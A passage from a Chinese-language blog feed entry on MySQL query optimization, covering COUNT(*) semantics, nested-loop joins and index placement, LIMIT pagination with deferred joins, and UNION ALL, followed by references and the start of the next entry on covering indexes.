NULL&#x3002;&#x5982;&#x679C;&#x786E;&#x8BA4;&#x62EC;&#x53F7;&#x4E2D;&#x7684;&#x8868;&#x8FBE;&#x5F0F;&#x4E0D;&#x53EF;&#x80FD;&#x4E3A;&#x7A7A;&#x65F6;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#x5C31;&#x662F;&#x5728;&#x7EDF;&#x8BA1;&#x884C;&#x6570;&#x3002;&#x6700;&#x7B80;&#x5355;&#x7684;&#x5C31;&#x662F;&#x5F53;&#x4F7F;&#x7528;<code>COUNT(*)</code>&#x65F6;&#xFF0C;&#x5E76;&#x4E0D;&#x662F;&#x6211;&#x4EEC;&#x6240;&#x60F3;&#x8C61;&#x7684;&#x90A3;&#x6837;&#x6269;&#x5C55;&#x6210;&#x6240;&#x6709;&#x7684;&#x5217;&#xFF0C;&#x5B9E;&#x9645;&#x4E0A;&#xFF0C;&#x5B83;&#x4F1A;&#x5FFD;&#x7565;&#x6240;&#x6709;&#x7684;&#x5217;&#x800C;&#x76F4;&#x63A5;&#x7EDF;&#x8BA1;&#x884C;&#x6570;&#x3002;</p><p>&#x6211;&#x4EEC;&#x6700;&#x5E38;&#x89C1;&#x7684;&#x8BEF;&#x89E3;&#x4E5F;&#x5C31;&#x5728;&#x8FD9;&#x513F;&#xFF0C;&#x5728;&#x62EC;&#x53F7;&#x5185;&#x6307;&#x5B9A;&#x4E86;&#x4E00;&#x5217;&#x5374;&#x5E0C;&#x671B;&#x7EDF;&#x8BA1;&#x7ED3;&#x679C;&#x662F;&#x884C;&#x6570;&#xFF0C;&#x800C;&#x4E14;&#x8FD8;&#x5E38;&#x5E38;&#x8BEF;&#x4EE5;&#x4E3A;&#x524D;&#x8005;&#x7684;&#x6027;&#x80FD;&#x4F1A;&#x66F4;&#x597D;&#x3002;&#x4F46;&#x5B9E;&#x9645;&#x5E76;&#x975E;&#x8FD9;&#x6837;&#xFF0C;&#x5982;&#x679C;&#x8981;&#x7EDF;&#x8BA1;&#x884C;&#x6570;&#xFF0C;&#x76F4;&#x63A5;&#x4F7F;&#x7528;<code>COUNT(*)</code>&#xFF0C;&#x610F;&#x4E49;&#x6E05;&#x6670;&#xFF0C;&#x4E14;&#x6027;&#x80FD;&#x66F4;&#x597D;&#x3002;</p><p>&#x6709;&#x65F6;&#x5019;&#x67D0;&#x4E9B;&#x4E1A;&#x52A1;&#x573A;&#x666F;&#x5E76;&#x4E0D;&#x9700;&#x8981;&#x5B8C;&#x5168;&#x7CBE;&#x786E;&#x7684;<code>COUNT</code>&#x503C;&#xFF0C;&#x53EF;&#x4EE5;&#x7528;&#x8FD1;&#x4F3C;&#x503C;&#x6765;&#x4EE3;&#x66FF;&#xFF0C;<code>EXPLAIN</code> &#x51FA;&#x6765;&#x7684;&#x884C;&#x6570;&#x5C31;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x9519;&#x7684;&#x8FD1;&#x4F3C;&#x503C;&#xFF0C;&#x800C;&#x4E14;&#x6267;&#x884C; <code>EXPLAIN</code> &#x5E76;&#x4E0D;&#x9700;&#x8981;&#x771F;&#x6B63;&#x5730;&#x53BB;&#x6267;&#x884C;&#x67E5;&#x8BE2;&#xFF0C;&#x6240;&#x4EE5;&#x6210;&#x672C;&#x975E;&#x5E38;&#x4F4E;&#x3002;&#x901A;&#x5E38;&#x6765;&#x8BF4;&#xFF0C;&#x6267;&#x884C;<code>COUNT()</code>&#x90FD;&#x9700;&#x8981;&#x626B;&#x63CF;&#x5927;&#x91CF;&#x7684;&#x884C;&#x624D;&#x80FD;&#x83B7;&#x53D6;&#x5230;&#x7CBE;&#x786E;&#x7684;&#x6570;&#x636E;&#xFF0C;&#x56E0;&#x6B64;&#x5F88;&#x96BE;&#x4F18;&#x5316;&#xFF0C;MySQL &#x5C42;&#x9762;&#x8FD8;&#x80FD;&#x505A;&#x5F97;&#x4E5F;&#x5C31;&#x53EA;&#x6709;&#x8986;&#x76D6;&#x7D22;&#x5F15;&#x4E86;&#x3002;&#x5982;&#x679C;&#x4E0D;&#x8FD8;&#x80FD;&#x89E3;&#x51B3;&#x95EE;&#x9898;&#xFF0C;&#x53EA;&#x6709;&#x4ECE;&#x67B6;&#x6784;&#x5C42;&#x9762;&#x89E3;&#x51B3;&#x4E86;&#xFF0C;&#x6BD4;&#x5982;&#x6DFB;&#x52A0;&#x6C47;&#x603B;&#x8868;&#xFF0C;&#x6216;&#x8005;&#x4F7F;&#x7528; <code>redis</code> &#x8FD9;&#x6837;&#x7684;&#x5916;&#x90E8;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#x3002;</p><p><strong>&#x4F18;&#x5316;&#x5173;&#x8054;&#x67E5;&#x8BE2;</strong></p><p>&#x5728;&#x5927;&#x6570;&#x636E;&#x573A;&#x666F;&#x4E0B;&#xFF0C;&#x8868;&#x4E0E;&#x8868;&#x4E4B;&#x95F4;&#x901A;&#x8FC7;&#x4E00;&#x4E2A;&#x5197;&#x4F59;&#x5B57;&#x6BB5;&#x6765;&#x5173;&#x8054;&#xFF0C;&#x8981;&#x6BD4;&#x76F4;&#x63A5;&#x4F7F;&#x7528;JOIN&#x6709;&#x66F4;&#x597D;&#x7684;&#x6027;&#x80FD;&#x3002;&#x5982;&#x679C;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x9700;&#x8981;&#x7279;&#x522B;&#x6CE8;&#x610F;&#x7684;&#x662F;&#xFF1A;</p><ul><li>&#x786E;&#x4FDD;<code>ON</code>&#x548C;<code>USING</code>&#x5B57;&#x53E5;&#x4E2D;&#x7684;&#x5217;&#x4E0A;&#x6709;&#x7D22;&#x5F15;&#x3002;&#x5728;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x7684;&#x65F6;&#x5019;&#x5C31;&#x8981;&#x8003;&#x8651;&#x5230;&#x5173;&#x8054;&#x7684;&#x987A;&#x5E8F;&#x3002;&#x5F53;&#x8868; <code>A</code> &#x548C;&#x8868; <code>B</code> &#x7528;&#x5217; <code>c</code> &#x5173;&#x8054;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x5982;&#x679C;&#x4F18;&#x5316;&#x5668;&#x5173;&#x8054;&#x7684;&#x987A;&#x5E8F;&#x662F; <code>A</code>&#x3001;<code>B</code>&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x4E0D;&#x9700;&#x8981;&#x5728; <code>A</code> &#x8868;&#x7684;&#x5BF9;&#x5E94;&#x5217;&#x4E0A;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x3002;&#x6CA1;&#x6709;&#x7528;&#x5230;&#x7684;&#x7D22;&#x5F15;&#x4F1A;&#x5E26;&#x6765;&#x989D;&#x5916;&#x7684;&#x8D1F;&#x62C5;&#xFF0C;&#x4E00;&#x822C;&#x6765;&#x8BF4;&#xFF0C;&#x9664;&#x975E;&#x6709;&#x5176;&#x4ED6;&#x7406;&#x7531;&#xFF0C;&#x53EA;&#x9700;&#x8981;&#x5728;&#x5173;&#x8054;&#x987A;&#x5E8F;&#x4E2D;&#x7684;&#x7B2C;&#x4E8C;&#x5F20;&#x8868;&#x7684;&#x76F8;&#x5E94;&#x5217;&#x4E0A;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#xFF08;&#x5177;&#x4F53;&#x539F;&#x56E0;&#x4E0B;&#x6587;&#x5206;&#x6790;&#xFF09;&#x3002;</li><li>&#x786E;&#x4FDD;&#x4EFB;&#x4F55;&#x7684;<code>GROUP BY</code>&#x548C;<code>ORDER BY</code>&#x4E2D;&#x7684;&#x8868;&#x8FBE;&#x5F0F;&#x53EA;&#x6D89;&#x53CA;&#x5230;&#x4E00;&#x4E2A;&#x8868;&#x4E2D;&#x7684;&#x5217;&#xFF0C;&#x8FD9;&#x6837; MySQL &#x624D;&#x6709;&#x53EF;&#x80FD;&#x4F7F;&#x7528;&#x7D22;&#x5F15;&#x6765;&#x4F18;&#x5316;&#x3002;</li></ul><p>&#x8981;&#x7406;&#x89E3;&#x4F18;&#x5316;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x7B2C;&#x4E00;&#x4E2A;&#x6280;&#x5DE7;&#xFF0C;&#x5C31;&#x9700;&#x8981;&#x7406;&#x89E3; MySQL &#x662F;&#x5982;&#x4F55;&#x6267;&#x884C;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x7684;&#x3002;&#x5F53;&#x524D; MySQL &#x5173;&#x8054;&#x6267;&#x884C;&#x7684;&#x7B56;&#x7565;&#x975E;&#x5E38;&#x7B80;&#x5355;&#xFF0C;&#x5B83;&#x5BF9;&#x4EFB;&#x4F55;&#x7684;&#x5173;&#x8054;&#x90FD;<strong>&#x6267;&#x884C;&#x5D4C;&#x5957;&#x5FAA;&#x73AF;&#x5173;&#x8054;&#x64CD;&#x4F5C;</strong>&#xFF0C;&#x5373;&#x5148;&#x5728;&#x4E00;&#x4E2A;&#x8868;&#x4E2D;&#x5FAA;&#x73AF;&#x53D6;&#x51FA;&#x5355;&#x6761;&#x6570;&#x636E;&#xFF0C;&#x7136;&#x540E;&#x5728;&#x5D4C;&#x5957;&#x5FAA;&#x73AF;&#x5230;&#x4E0B;&#x4E00;&#x4E2A;&#x8868;&#x4E2D;&#x5BFB;&#x627E;&#x5339;&#x914D;&#x7684;&#x884C;&#xFF0C;&#x4F9D;&#x6B21;&#x4E0B;&#x53BB;&#xFF0C;&#x76F4;&#x5230;&#x627E;&#x5230;&#x6240;&#x6709;&#x8868;&#x4E2D;&#x5339;&#x914D;&#x7684;&#x884C;&#x4E3A;&#x4E3A;&#x6B62;&#x3002;&#x7136;&#x540E;&#x6839;&#x636E;&#x5404;&#x4E2A;&#x8868;&#x5339;&#x914D;&#x7684;&#x884C;&#xFF0C;&#x8FD4;&#x56DE;&#x67E5;&#x8BE2;&#x4E2D;&#x9700;&#x8981;&#x7684;&#x5404;&#x4E2A;&#x5217;&#x3002;</p><p>&#x592A;&#x62BD;&#x8C61;&#x4E86;&#xFF1F;&#x4EE5;&#x4E0A;&#x9762;&#x7684;&#x793A;&#x4F8B;&#x6765;&#x8BF4;&#x660E;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x8FD9;&#x6837;&#x7684;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT A.xx,B.yy FROM A INNER JOIN B USING(c) WHERE A.xx IN (5,6)</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5047;&#x8BBE; MySQL &#x6309;&#x7167;&#x67E5;&#x8BE2;&#x4E2D;&#x7684;&#x5173;&#x8054;&#x987A;&#x5E8F; A&#x3001;B &#x6765;&#x8FDB;&#x884C;&#x5173;&#x8054;&#x64CD;&#x4F5C;&#xFF0C;&#x90A3;&#x4E48;&#x53EF;&#x4EE5;&#x7528;&#x4E0B;&#x9762;&#x7684;&#x4F2A;&#x4EE3;&#x7801;&#x8868;&#x793A; MySQL &#x5982;&#x4F55;&#x5B8C;&#x6210;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">outer_iterator = SELECT A.xx,A.c FROM A WHERE A.xx IN (5,6);</span><br><span class="line">outer_row = outer_iterator.next;</span><br><span class="line"><span class="keyword">while</span>(outer_row) {</span><br><span class="line">    inner_iterator = SELECT B.yy FROM B WHERE B.c = outer_row.c;</span><br><span class="line">    inner_row = inner_iterator.next;</span><br><span class="line">    <span class="keyword">while</span>(inner_row) {</span><br><span class="line">        output[inner_row.yy,outer_row.xx];</span><br><span class="line">        inner_row = inner_iterator.next;</span><br><span class="line">    }</span><br><span class="line">    outer_row = outer_iterator.next;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x53EF;&#x4EE5;&#x770B;&#x5230;&#xFF0C;&#x6700;&#x5916;&#x5C42;&#x7684;&#x67E5;&#x8BE2;&#x662F;&#x6839;&#x636E;A.xx&#x5217;&#x6765;&#x67E5;&#x8BE2;&#x7684;&#xFF0C;A.c&#x4E0A;&#x5982;&#x679C;&#x6709;&#x7D22;&#x5F15;&#x7684;&#x8BDD;&#xFF0C;&#x6574;&#x4E2A;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x4E5F;&#x4E0D;&#x4F1A;&#x4F7F;&#x7528;&#x3002;&#x518D;&#x770B;&#x5185;&#x5C42;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;&#x5F88;&#x660E;&#x663E;B.c&#x4E0A;&#x5982;&#x679C;&#x6709;&#x7D22;&#x5F15;&#x7684;&#x8BDD;&#xFF0C;&#x80FD;&#x591F;&#x52A0;&#x901F;&#x67E5;&#x8BE2;&#xFF0C;&#x56E0;&#x6B64;&#x53EA;&#x9700;&#x8981;&#x5728;&#x5173;&#x8054;&#x987A;&#x5E8F;&#x4E2D;&#x7684;&#x7B2C;&#x4E8C;&#x5F20;&#x8868;&#x7684;&#x76F8;&#x5E94;&#x5217;&#x4E0A;&#x521B;&#x5EFA;&#x7D22;&#x5F15;&#x5373;&#x53EF;&#x3002;</p><p><strong>&#x4F18;&#x5316; LIMIT &#x5206;&#x9875;</strong></p><p>&#x5F53;&#x9700;&#x8981;&#x5206;&#x9875;&#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x901A;&#x5E38;&#x4F1A;&#x4F7F;&#x7528;LIMIT&#x52A0;&#x4E0A;&#x504F;&#x79FB;&#x91CF;&#x7684;&#x529E;&#x6CD5;&#x5B9E;&#x73B0;&#xFF0C;&#x540C;&#x65F6;&#x52A0;&#x4E0A;&#x5408;&#x9002;&#x7684;ORDER BY&#x5B57;&#x53E5;&#x3002;&#x5982;&#x679C;&#x6709;&#x5BF9;&#x5E94;&#x7684;&#x7D22;&#x5F15;&#xFF0C;&#x901A;&#x5E38;&#x6548;&#x7387;&#x4F1A;&#x4E0D;&#x9519;&#xFF0C;&#x5426;&#x5219;&#xFF0C;MySQL &#x9700;&#x8981;&#x505A;&#x5927;&#x91CF;&#x7684;&#x6587;&#x4EF6;&#x6392;&#x5E8F;&#x64CD;&#x4F5C;&#x3002;</p><p>&#x4E00;&#x4E2A;&#x5E38;&#x89C1;&#x7684;&#x95EE;&#x9898;&#x662F;&#x5F53;&#x504F;&#x79FB;&#x91CF;&#x975E;&#x5E38;&#x5927;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x6BD4;&#x5982;&#xFF1A;LIMIT 10000 20&#x8FD9;&#x6837;&#x7684;&#x67E5;&#x8BE2;&#xFF0C;MySQL &#x9700;&#x8981;&#x67E5;&#x8BE2; 10020 &#x6761;&#x8BB0;&#x5F55;&#x7136;&#x540E;&#x53EA;&#x8FD4;&#x56DE; 20 &#x6761;&#x8BB0;&#x5F55;&#xFF0C;&#x524D;&#x9762;&#x7684; 10000 &#x6761;&#x90FD;&#x5C06;&#x88AB;&#x629B;&#x5F03;&#xFF0C;&#x8FD9;&#x6837;&#x7684;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x9AD8;&#x3002;</p><p>&#x4F18;&#x5316;&#x8FD9;&#x79CD;&#x67E5;&#x8BE2;&#x4E00;&#x4E2A;&#x6700;&#x7B80;&#x5355;&#x7684;&#x529E;&#x6CD5;&#x5C31;&#x662F;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x4F7F;&#x7528;&#x8986;&#x76D6;&#x7D22;&#x5F15;&#x626B;&#x63CF;&#xFF0C;&#x800C;&#x4E0D;&#x662F;&#x67E5;&#x8BE2;&#x6240;&#x6709;&#x7684;&#x5217;&#x3002;&#x7136;&#x540E;&#x6839;&#x636E;&#x9700;&#x8981;&#x505A;&#x4E00;&#x6B21;&#x5173;&#x8054;&#x67E5;&#x8BE2;&#x518D;&#x8FD4;&#x56DE;&#x6240;&#x6709;&#x7684;&#x5217;&#x3002;&#x5BF9;&#x4E8E;&#x504F;&#x79FB;&#x91CF;&#x5F88;&#x5927;&#x65F6;&#xFF0C;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x6548;&#x7387;&#x4F1A;&#x63D0;&#x5347;&#x975E;&#x5E38;&#x5927;&#x3002;&#x8003;&#x8651;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT film_id,description FROM film ORDER BY title LIMIT 50,5;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5982;&#x679C;&#x8FD9;&#x5F20;&#x8868;&#x975E;&#x5E38;&#x5927;&#xFF0C;&#x90A3;&#x4E48;&#x8FD9;&#x4E2A;&#x67E5;&#x8BE2;&#x6700;&#x597D;&#x6539;&#x6210;&#x4E0B;&#x9762;&#x7684;&#x6837;&#x5B50;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SELECT film.film_id,film.description</span><br><span class="line">FROM film INNER JOIN (</span><br><span class="line">    SELECT film_id FROM film ORDER BY title LIMIT 50,5</span><br><span class="line">) AS tmp USING(film_id);</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x8FD9;&#x91CC;&#x7684;&#x5EF6;&#x8FDF;&#x5173;&#x8054;&#x5C06;&#x5927;&#x5927;&#x63D0;&#x5347;&#x67E5;&#x8BE2;&#x6548;&#x7387;&#xFF0C;&#x8BA9; MySQL &#x626B;&#x63CF;&#x5C3D;&#x53EF;&#x80FD;&#x5C11;&#x7684;&#x9875;&#x9762;&#xFF0C;&#x83B7;&#x53D6;&#x9700;&#x8981;&#x8BBF;&#x95EE;&#x7684;&#x8BB0;&#x5F55;&#x540E;&#x5728;&#x6839;&#x636E;&#x5173;&#x8054;&#x5217;&#x56DE;&#x539F;&#x8868;&#x67E5;&#x8BE2;&#x6240;&#x9700;&#x8981;&#x7684;&#x5217;&#x3002;</p><p>&#x6709;&#x65F6;&#x5019;&#x5982;&#x679C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x4E66;&#x7B7E;&#x8BB0;&#x5F55;&#x4E0A;&#x6B21;&#x53D6;&#x6570;&#x636E;&#x7684;&#x4F4D;&#x7F6E;&#xFF0C;&#x90A3;&#x4E48;&#x4E0B;&#x6B21;&#x5C31;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x4ECE;&#x8BE5;&#x4E66;&#x7B7E;&#x8BB0;&#x5F55;&#x7684;&#x4F4D;&#x7F6E;&#x5F00;&#x59CB;&#x626B;&#x63CF;&#xFF0C;&#x8FD9;&#x6837;&#x5C31;&#x53EF;&#x4EE5;&#x907F;&#x514D;&#x4F7F;&#x7528;OFFSET&#xFF0C;&#x6BD4;&#x5982;&#x4E0B;&#x9762;&#x7684;&#x67E5;&#x8BE2;&#xFF1A;<br></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT id FROM t LIMIT 10000, 10;</span><br><span class="line">-- &#x6539;&#x4E3A;&#xFF1A;</span><br><span class="line">SELECT id FROM t WHERE id &gt; 10000 LIMIT 10;</span><br></pre></td></tr></tbody></table></figure><p></p><p>&#x5176;&#x4ED6;&#x4F18;&#x5316;&#x7684;&#x529E;&#x6CD5;&#x8FD8;&#x5305;&#x62EC;&#x4F7F;&#x7528;&#x9884;&#x5148;&#x8BA1;&#x7B97;&#x7684;&#x6C47;&#x603B;&#x8868;&#xFF0C;&#x6216;&#x8005;&#x5173;&#x8054;&#x5230;&#x4E00;&#x4E2A;&#x5197;&#x4F59;&#x8868;&#xFF0C;&#x5197;&#x4F59;&#x8868;&#x4E2D;&#x53EA;&#x5305;&#x542B;&#x4E3B;&#x952E;&#x5217;&#x548C;&#x9700;&#x8981;&#x505A;&#x6392;&#x5E8F;&#x7684;&#x5217;&#x3002;</p><p><strong>&#x4F18;&#x5316; UNION</strong><br>MySQL &#x5904;&#x7406;UNION&#x7684;&#x7B56;&#x7565;&#x662F;&#x5148;&#x521B;&#x5EFA;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x628A;&#x5404;&#x4E2A;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x63D2;&#x5165;&#x5230;&#x4E34;&#x65F6;&#x8868;&#x4E2D;&#xFF0C;&#x6700;&#x540E;&#x518D;&#x6765;&#x505A;&#x67E5;&#x8BE2;&#x3002;&#x56E0;&#x6B64;&#x5F88;&#x591A;&#x4F18;&#x5316;&#x7B56;&#x7565;&#x5728;UNION&#x67E5;&#x8BE2;&#x4E2D;&#x90FD;&#x6CA1;&#x6709;&#x529E;&#x6CD5;&#x5F88;&#x597D;&#x7684;&#x65F6;&#x5019;&#x3002;&#x7ECF;&#x5E38;&#x9700;&#x8981;&#x624B;&#x52A8;&#x5C06;WHERE&#x3001;LIMIT&#x3001;ORDER BY&#x7B49;&#x5B57;&#x53E5; &#x201C;&#x4E0B;&#x63A8;&#x201D; &#x5230;&#x5404;&#x4E2A;&#x5B50;&#x67E5;&#x8BE2;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x4F18;&#x5316;&#x5668;&#x53EF;&#x4EE5;&#x5145;&#x5206;&#x5229;&#x7528;&#x8FD9;&#x4E9B;&#x6761;&#x4EF6;&#x5148;&#x4F18;&#x5316;&#x3002;</p><p>&#x9664;&#x975E;&#x786E;&#x5B9E;&#x9700;&#x8981;&#x670D;&#x52A1;&#x5668;&#x53BB;&#x91CD;&#xFF0C;&#x5426;&#x5219;&#x5C31;&#x4E00;&#x5B9A;&#x8981;&#x4F7F;&#x7528;UNION ALL&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;ALL&#x5173;&#x952E;&#x5B57;&#xFF0C;MySQL &#x4F1A;&#x7ED9;&#x4E34;&#x65F6;&#x8868;&#x52A0;&#x4E0A;DISTINCT&#x9009;&#x9879;&#xFF0C;&#x8FD9;&#x4F1A;&#x5BFC;&#x81F4;&#x6574;&#x4E2A;&#x4E34;&#x65F6;&#x8868;&#x7684;&#x6570;&#x636E;&#x505A;&#x552F;&#x4E00;&#x6027;&#x68C0;&#x67E5;&#xFF0C;&#x8FD9;&#x6837;&#x505A;&#x7684;&#x4EE3;&#x4EF7;&#x975E;&#x5E38;&#x9AD8;&#x3002;&#x5F53;&#x7136;&#x5373;&#x4F7F;&#x4F7F;&#x7528; ALL &#x5173;&#x952E;&#x5B57;&#xFF0C;MySQL &#x603B;&#x662F;&#x5C06;&#x7ED3;&#x679C;&#x653E;&#x5165;&#x4E34;&#x65F6;&#x8868;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x8BFB;&#x51FA;&#xFF0C;&#x518D;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x867D;&#x7136;&#x5F88;&#x591A;&#x65F6;&#x5019;&#x6CA1;&#x6709;&#x8FD9;&#x4E2A;&#x5FC5;&#x8981;&#xFF0C;&#x6BD4;&#x5982;&#x6709;&#x65F6;&#x5019;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x628A;&#x6BCF;&#x4E2A;&#x5B50;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x8FD4;&#x56DE;&#x7ED9;&#x5BA2;&#x6237;&#x7AEF;&#x3002;</p><h2 id="&#x7ED3;&#x8BED;"><a href="#&#x7ED3;&#x8BED;" class="headerlink" title="&#x7ED3;&#x8BED;"></a>&#x7ED3;&#x8BED;</h2><p>&#x7406;&#x89E3;&#x67E5;&#x8BE2;&#x662F;&#x5982;&#x4F55;&#x6267;&#x884C;&#x4EE5;&#x53CA;&#x65F6;&#x95F4;&#x90FD;&#x6D88;&#x8017;&#x5728;&#x54EA;&#x4E9B;&#x5730;&#x65B9;&#xFF0C;&#x518D;&#x52A0;&#x4E0A;&#x4E00;&#x4E9B;&#x4F18;&#x5316;&#x8FC7;&#x7A0B;&#x7684;&#x77E5;&#x8BC6;&#xFF0C;&#x53EF;&#x4EE5;&#x5E2E;&#x52A9;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x7406;&#x89E3; MySQL&#xFF0C;&#x7406;&#x89E3;&#x5E38;&#x89C1;&#x4F18;&#x5316;&#x6280;&#x5DE7;&#x80CC;&#x540E;&#x7684;&#x539F;&#x7406;&#x3002;&#x5E0C;&#x671B;&#x672C;&#x6587;&#x4E2D;&#x7684;&#x539F;&#x7406;&#x3001;&#x793A;&#x4F8B;&#x80FD;&#x591F;&#x5E2E;&#x52A9;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x5C06;&#x7406;&#x8BBA;&#x548C;&#x5B9E;&#x8DF5;&#x8054;&#x7CFB;&#x8D77;&#x6765;&#xFF0C;&#x66F4;&#x591A;&#x7684;&#x5C06;&#x7406;&#x8BBA;&#x77E5;&#x8BC6;&#x8FD0;&#x7528;&#x5230;&#x5B9E;&#x8DF5;&#x4E2D;&#x3002;</p><p>&#x5176;&#x4ED6;&#x4E5F;&#x6CA1;&#x5565;&#x8BF4;&#x7684;&#x4E86;&#xFF0C;&#x7ED9;&#x5927;&#x5BB6;&#x7559;&#x4E24;&#x4E2A;&#x601D;&#x8003;&#x9898;&#x5427;&#xFF0C;&#x53EF;&#x4EE5;&#x5728;&#x8111;&#x888B;&#x91CC;&#x60F3;&#x60F3;&#x7B54;&#x6848;&#xFF0C;&#x8FD9;&#x4E5F;&#x662F;&#x5927;&#x5BB6;&#x7ECF;&#x5E38;&#x6302;&#x5728;&#x5634;&#x8FB9;&#x7684;&#xFF0C;&#x4F46;&#x5F88;&#x5C11;&#x6709;&#x4EBA;&#x4F1A;&#x601D;&#x8003;&#x4E3A;&#x4EC0;&#x4E48;&#xFF1F;</p><ol><li>&#x6709;&#x975E;&#x5E38;&#x591A;&#x7684;&#x7A0B;&#x5E8F;&#x5458;&#x5728;&#x5206;&#x4EAB;&#x65F6;&#x90FD;&#x4F1A;&#x629B;&#x51FA;&#x8FD9;&#x6837;&#x4E00;&#x4E2A;&#x89C2;&#x70B9;&#xFF1A;&#x5C3D;&#x53EF;&#x80FD;&#x4E0D;&#x8981;&#x4F7F;&#x7528;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF0C;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#x975E;&#x5E38;&#x4E0D;&#x5BB9;&#x6613;&#x7EF4;&#x62A4;&#xFF0C;&#x4E5F;&#x4F1A;&#x589E;&#x52A0;&#x4F7F;&#x7528;&#x6210;&#x672C;&#xFF0C;&#x5E94;&#x8BE5;&#x628A;&#x4E1A;&#x52A1;&#x903B;&#x8F91;&#x653E;&#x5230;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x65E2;&#x7136;&#x5BA2;&#x6237;&#x7AEF;&#x90FD;&#x80FD;&#x5E72;&#x8FD9;&#x4E9B;&#x4E8B;&#xFF0C;&#x90A3;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD8;&#x8981;&#x5B58;&#x50A8;&#x8FC7;&#x7A0B;&#xFF1F;</li><li>JOIN&#x672C;&#x8EAB;&#x4E5F;&#x633A;&#x65B9;&#x4FBF;&#x7684;&#xFF0C;&#x76F4;&#x63A5;&#x67E5;&#x8BE2;&#x5C31;&#x597D;&#x4E86;&#xFF0C;&#x4E3A;&#x4EC0;&#x4E48;&#x8FD8;&#x9700;&#x8981;&#x89C6;&#x56FE;&#x5462;&#xFF1F;</li></ol><p>&#x53C2;&#x8003;&#x8D44;&#x6599;</p><ul><li><a href="https://segmentfault.com/a/1190000004690721" target="_blank" rel="noopener">&#x7531; B-/B+&#x6811;&#x770B; MySQL&#x7D22;&#x5F15;&#x7ED3;&#x6784;</a></li><li>MySQL &#x6280;&#x672F;&#x5185;&#x5E55;&#xFF1A;InnoDB &#x5B58;&#x50A8;&#x5F15;&#x64CE;(&#x7B2C; 2 &#x7248;)</li><li>&#x9AD8;&#x6027;&#x80FD; MySQL(&#x7B2C; 3 &#x7248;)</li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;span itemprop=&quot;image&quot; itemscope itemtype=&quot;http://schema.org/ImageObject&quot;&gt;&lt;img itemprop=&quot;url image&quot; src=&quot;timg.jpeg&quot; class=&quot;full-image&quot; alt=&quot;
      
    
    </summary>
    
      <category term="MySQL" scheme="https://jiemin.wang/categories/MySQL/"/>
    
    
      <category term="MySQL" scheme="https://jiemin.wang/tags/MySQL/"/>
    
  </entry>
  
  <entry>
    <title>MySQL 优化之 Covering Index</title>
    <link href="https://jiemin.wang/2019/03/29/CoveringIndex/"/>
